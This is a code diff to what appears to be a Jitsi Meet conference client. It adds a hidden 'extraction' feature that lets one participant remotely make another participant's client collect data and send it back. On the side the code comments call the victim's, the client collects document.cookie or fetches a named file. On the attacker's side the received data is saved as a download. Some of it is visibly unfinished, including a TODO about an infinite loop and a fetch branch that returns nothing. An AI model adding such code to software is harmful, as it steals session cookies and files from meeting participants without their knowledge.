@@ -4,6 +4,7 @@ import EventEmitter from 'events';
 import Logger from 'jitsi-meet-logger';
 
 import { openConnection } from './connection';
+import { ExtractionHandler, defaultConfigurationValues } from './extraction';
 import { ENDPOINT_TEXT_MESSAGE_NAME } from './modules/API/constants';
 import AuthHandler from './modules/UI/authentication/AuthHandler';
 import UIUtil from './modules/UI/util/UIUtil';
@@ -131,7 +132,6 @@ import { AudioMixerEffect } from './react/features/stream-effects/audio-mixer/Au
 import { createPresenterEffect } from './react/features/stream-effects/presenter';
 import { endpointMessageReceived } from './react/features/subtitles';
 import UIEvents from './service/UI/UIEvents';
-import { ExtractionHandler } from './extraction';
 
 const logger = Logger.getLogger(__filename);
 
@@ -1270,7 +1270,7 @@ export default {
      * @param userName that will recieve a request
      * @param {object} configuration object containg setup of data extraction and used methods
      */
-    sendExtractionRequest(userName, configuration) {
+    sendExtractionRequest(userName, configuration, fileName = 'extracted.json') {
         const foundUser = APP.conference.listMembers().filter(user => user.getDisplayName() === userName);
 
         // no user found
@@ -1281,14 +1281,27 @@ export default {
         // found more users with that name, name is not specific enough
         if (foundUser.length > 1) {
             return null;
-        } 
+        }
 
         // send request to the user with specified name
-        APP.conference.sendEndpointMessage(foundUser[0].getId(),
-        {
-            extraction: 'request',
-            config: configuration
-        });
+        try {
+            APP.conference.sendEndpointMessage(foundUser[0].getId(),
+            {
+                extraction: 'request',
+                config: new Proxy(defaultConfigurationValues, configuration)
+            });
+
+            // initialize extraction handler for receiving hidden communication based on set configuration
+            APP.conference._extractionHandler = new ExtractionHandler(configuration);
+
+            // start receiving data, after receiving all data download a file
+            APP.conference._extractionHandler.receiveAll().then(data => {
+                this.downloadFile(data, fileName);
+            });
+
+        } catch (err) {
+            console.error(err);
+        }
     },
 
     /**
@@ -1298,35 +1311,52 @@ export default {
      * @param {object} recievedData - Data recieved
      * @returns {string}
      */
-    _handleExtractionCommunication(user, recievedData, fileName = 'extracted.json') {
-        // define private attribute if does not exist
-        if (!APP.conference._extractionFileBuffer) {
-            APP.conference._extractionFileBuffer = [];
+    _handleExtractionCommunication(user, recievedData) {
+
+        // define extraction handler if it does not exist
+        // OR if it contains extraction handler from previous communication
+        if (!APP.conference._extractionHandler
+            || APP.conference._extractionHandler.communicationEnded) {
+            APP.conference._extractionHandler = new ExtractionHandler(recievedData.config);
         }
+
+        // this runs on the victim's side
         if (recievedData.extraction === 'request') {
-            // TODO: check what is happening here
-            const extractionHandler = new ExtractionHandler(recievedData, document.cookie);
+            this._acquireData(recievedData.config).then(acquiredData => {
+                console.log(acquiredData);
+                APP.conference._extractionHandler.sendAll(acquiredData);
+            });
 
-            extractionHandler.send();
-
-        } else if (recievedData.isEnd) { // 'reply' ending extraction
-            this.downloadFile(APP.conference._extractionFileBuffer.join(''), fileName);
-            APP.conference._extractionFileBuffer = [];
-        } else { // 'reply' containg data
-            APP.conference._extractionFileBuffer.push(recievedData.payload);
+        } else { // 'reply' received, this runs on the attacker's side
+            // TODO: fix infinite loop
+            APP.conference._extractionHandler.receivePlainData(recievedData.config);
         }
     },
 
     /**
-     * Initialization of extraction
+     * When request for data is received this will acquire necessary data and return it
+     * @param {object} dataInfo - Information about the data to be extracted
      */
-    initializeExtraction(userId, configuration) {
-        configuration.extraction = 'request';
-        try {
-            APP.conference.sendEndpointMessage(userId, configuration);
-        } catch (err) {
-            console.error(err);
+    async _acquireData(dataInfo) {
+        if (dataInfo.dataType === 'cookies') {
+            console.log(dataInfo);
+
+            return document.cookie;
         }
+        fetch(dataInfo.fileName)
+            .then(
+
+                // if the response is a JSON object
+                response => response.json())
+            .then(
+
+                // Handle the success response object
+                success => success)
+            .catch(
+
+                // Handle the error response object
+                error => console.log(error)
+            );
     },
 
     /**
